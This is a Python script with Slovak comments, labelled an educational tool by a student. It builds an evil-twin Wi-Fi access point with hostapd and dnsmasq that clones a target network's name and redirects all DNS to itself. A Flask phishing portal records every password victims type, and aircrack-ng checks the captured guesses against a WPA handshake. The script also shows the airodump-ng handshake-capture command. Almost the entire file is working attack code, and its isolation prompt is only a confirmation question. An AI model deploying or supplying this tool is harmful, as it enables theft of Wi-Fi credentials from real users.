#!/usr/bin/env python3
"""
EDUKAČNÝ NÁSTROJ: Wi-Fi Phishing s Offline Overením
Použitie: IBA na vlastnom routeri v izolovanom prostredí
Autor: Edukačné účely – Andy (študent)
"""

import os
import sys
import subprocess
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file
import threading

# --- KONFIGURÁCIA ---
WIFI_SSID = "YourWiFiNetwork"  # Zmeňte na cieľové SSID
INTERFACE = "wlan1"            # Wi-Fi rozhranie pre falošný AP
HANDSHAKE_FILE = "MyHandShake.cap"  # Už zachytený handshake
LOG_DIR = "logs"
ATTEMPTS_LOG = os.path.join(LOG_DIR, "password_attempts.txt")
SUCCESS_LOG = os.path.join(LOG_DIR, "successful_password.txt")

# --- FARBY PRE TERMINÁL ---
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
RESET = '\033[0m'

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

# Globálne premenné pre procesy
hostapd_process = None
dnsmasq_process = None

# --- BEZPEČNOSTNÉ KONTROLY ---
def safety_check():
    """Kontrola bezpečnostných podmienok pred spustením"""
    print(f"\n{YELLOW}[!] BEZPEČNOSTNÁ KONTROLA{RESET}")
    
    # 1. Kontrola root oprávnení
    if os.geteuid() != 0:
        print(f"{RED}[✗] Skript vyžaduje sudo!{RESET}")
        print(f"    Spustite: {GREEN}sudo python3 main.py{RESET}")
        sys.exit(1)
    
    # 2. Potvrdenie izolácie
    print(f"\n{YELLOW}⚠️  DÔLEŽITÉ:{RESET}")
    print(f"    Tento skript používajte IBA na vlastnom routeri,")
    print(f"    ktorý je FYZICKY IZOLOVANÝ (žiadny signál mimo vášho priestoru).")
    confirm = input(f"\n{BLUE}Potvrdzujem izoláciu a vlastníctvo routeru [ano/nie]: {RESET}")
    
    if confirm.lower() not in ["ano", "yes", "a"]:
        print(f"{RED}[✗] Bez potvrdenia skript NESPÚSTAME.{RESET}")
        sys.exit(0)
    
    # 3. Kontrola existencie handshake súboru
    if not os.path.exists(HANDSHAKE_FILE):
        print(f"{RED}[✗] Súbor {HANDSHAKE_FILE} neexistuje!{RESET}")
        print(f"{YELLOW}[i] Zachytite handshake pomocou:{RESET}")
        print(f"    sudo airodump-ng -c [kanál] --bssid [BSSID] -w capture wlan0mon")
        sys.exit(1)
    
    # 4. Vytvorenie log adresára
    os.makedirs(LOG_DIR, exist_ok=True)
    
    print(f"{GREEN}[✓] Bezpečnostné kontroly prešli – pokračujeme{RESET}\n")

# --- NASTAVENIE FALOŠNÉHO AP ---
def setup_fake_ap():
    """Vytvorí falošný prístupový bod pomocou hostapd"""
    global hostapd_process, dnsmasq_process
    
    print(f"{BLUE}[i] Konfigurácia falošného AP...{RESET}")
    
    # 1. Vytvorenie hostapd.conf
    hostapd_config = f'''
interface={INTERFACE}
driver=nl80211
ssid={WIFI_SSID}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
'''
    
    with open("hostapd.conf", "w") as f:
        f.write(hostapd_config)
    
    # 2. Vytvorenie dnsmasq.conf pre DHCP a DNS
    dnsmasq_config = f'''
interface={INTERFACE}
dhcp-range=192.168.42.10,192.168.42.50,255.255.255.0,12h
dhcp-option=3,192.168.42.1
dhcp-option=6,192.168.42.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/{INTERFACE}
'''
    
    with open("dnsmasq.conf", "w") as f:
        f.write(dnsmasq_config)
    
    # 3. Nastavenie IP adresy pre rozhranie
    print(f"{BLUE}[i] Nastavujem IP adresu pre {INTERFACE}...{RESET}")
    subprocess.run(["ip", "link", "set", INTERFACE, "down"], capture_output=True)
    subprocess.run(["ip", "addr", "flush", INTERFACE], capture_output=True)
    subprocess.run(["ip", "addr", "add", "192.168.42.1/24", "dev", INTERFACE], capture_output=True)
    subprocess.run(["ip", "link", "set", INTERFACE, "up"], capture_output=True)
    
    # 4. Spustenie hostapd
    print(f"{BLUE}[i] Spúšťam hostapd...{RESET}")
    hostapd_process = subprocess.Popen(
        ["hostapd", "hostapd.conf"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True
    )
    
    # 5. Spustenie dnsmasq
    print(f"{BLUE}[i] Spúšťam dnsmasq...{RESET}")
    dnsmasq_process = subprocess.Popen(
        ["dnsmasq", "-C", "dnsmasq.conf", "-d"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True
    )
    
    print(f"{GREEN}[✓] Falošný AP aktívny: {WIFI_SSID}{RESET}")
    print(f"{GREEN}[✓] IP rozsah: 192.168.42.10 - 192.168.42.50{RESET}\n")

# --- ČISTENIE PO SEBE ---
def cleanup():
    """Ukončí procesy a obnoví sieťové nastavenia"""
    global hostapd_process, dnsmasq_process
    
    print(f"\n{BLUE}[i] Čistenie – ukončujem procesy...{RESET}")
    
    if hostapd_process:
        hostapd_process.terminate()
        print(f"{GREEN}[✓] hostapd zastavený{RESET}")
    
    if dnsmasq_process:
        dnsmasq_process.terminate()
        print(f"{GREEN}[✓] dnsmasq zastavený{RESET}")
    
    # Obnovenie NetworkManager
    subprocess.run(["systemctl", "start", "NetworkManager"], capture_output=True)
    
    print(f"{GREEN}[✓] Sieťové služby obnovené{RESET}")

# --- FLASK ROUTES ---
@app.route('/')
def index():
    """Hlavná phishing stránka"""
    return render_template('index.html', ssid=WIFI_SSID)

@app.route('/check_password', methods=['POST'])
def check_password():
    """
    Prijme heslo od používateľa a uloží ho do logu.
    OVEROVANIE SA ROBÍ OFFLINE – nie v reálnom čase!
    """
    try:
        data = request.get_json()
        password = data.get('password', '').strip()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if not password:
            return jsonify({'message': 'Please enter a password.', 'success': False})
        
        # Uloženie pokusu do logu
        with open(ATTEMPTS_LOG, "a") as f:
            f.write(f"[{timestamp}] {password}\n")
        
        print(f"{YELLOW}[LOG] Pokus: {password}{RESET}")
        
        # Okamžitá odpoveď používateľovi (bez čakania na overenie)
        return jsonify({
            'message': 'Authenticating... Please wait.',
            'success': True
        })
        
    except Exception as e:
        print(f"{RED}[ERROR] {e}{RESET}")
        return jsonify({'message': 'Error occurred.', 'success': False})

@app.route('/verify_passwords', methods=['GET'])
def verify_passwords():
    """
    OFFLINE overenie hesiel proti handshake.
    Spustí sa manuálne útočníkom (nie automaticky).
    """
    if not os.path.exists(ATTEMPTS_LOG):
        return jsonify({'message': 'No password attempts found.', 'success': False})
    
    # Spustenie aircrack-ng na všetkých pokusoch
    print(f"{BLUE}[i] Overujem heslá proti {HANDSHAKE_FILE}...{RESET}")
    
    result = subprocess.run(
        ["aircrack-ng", HANDSHAKE_FILE, "-w", ATTEMPTS_LOG],
        capture_output=True,
        text=True
    )
    
    # Kontrola výsledku
    if "KEY FOUND" in result.stdout:
        # Extrahovanie nájdeného hesla
        import re
        match = re.search(r'KEY FOUND! \[ ([^\]]+) \]', result.stdout)
        if match:
            correct_password = match.group(1)
            
            # Uloženie správneho hesla
            with open(SUCCESS_LOG, "w") as f:
                f.write(f"Found on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Password: {correct_password}\n")
            
            print(f"{GREEN}[✓] HESLO NÁJDENÉ: {correct_password}{RESET}")
            return jsonify({
                'message': f'Password found: {correct_password}',
                'success': True,
                'password': correct_password
            })
    
    print(f"{YELLOW}[i] Heslo nebolo nájdené.{RESET}")
    return jsonify({
        'message': 'No correct password found.',
        'success': False
    })

@app.route('/get_stats', methods=['GET'])
def get_stats():
    """Vráti štatistiky o pokusoch"""
    attempts = 0
    if os.path.exists(ATTEMPTS_LOG):
        with open(ATTEMPTS_LOG, "r") as f:
            attempts = len(f.readlines())
    
    success = os.path.exists(SUCCESS_LOG)
    
    return jsonify({
        'attempts': attempts,
        'success': success
    })

@app.route('/download_attempts', methods=['GET'])
def download_attempts():
    """Stiahnutie logu pokusov"""
    if os.path.exists(ATTEMPTS_LOG):
        return send_file(ATTEMPTS_LOG, as_attachment=True)
    return jsonify({'message': 'No attempts log found.', 'success': False})

@app.route('/download_success', methods=['GET'])
def download_success():
    """Stiahnutie správneho hesla"""
    if os.path.exists(SUCCESS_LOG):
        return send_file(SUCCESS_LOG, as_attachment=True)
    return jsonify({'message': 'No successful password found.', 'success': False})

# --- HLAVNÁ FUNKCIA ---
def main():
    print(f"{GREEN}╔════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{GREEN}║  EDUKAČNÝ NÁSTROJ: Wi-Fi Phishing s Offline Overením     ║{RESET}")
    print(f"{GREEN}║  Použitie: VÝHRADNE na vlastnom, izolovanom routeri       ║{RESET}")
    print(f"{GREEN}╚════════════════════════════════════════════════════════════╝{RESET}")
    
    safety_check()
    setup_fake_ap()
    
    print(f"{BLUE}[i] Spúšťam Flask server...{RESET}")
    print(f"{GREEN}[✓] Phishing stránka: http://192.168.42.1{RESET}")
    print(f"{YELLOW}[i] Na overenie hesiel použite: /verify_passwords{RESET}")
    print(f"{YELLOW}[i] Pre štatistiky: /get_stats{RESET}\n")
    
    try:
        app.run(host='0.0.0.0', port=80, debug=False, threaded=True)
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Ctrl+C – ukončujem...{RESET}")
    finally:
        cleanup()

if __name__ == "__main__":
    main()
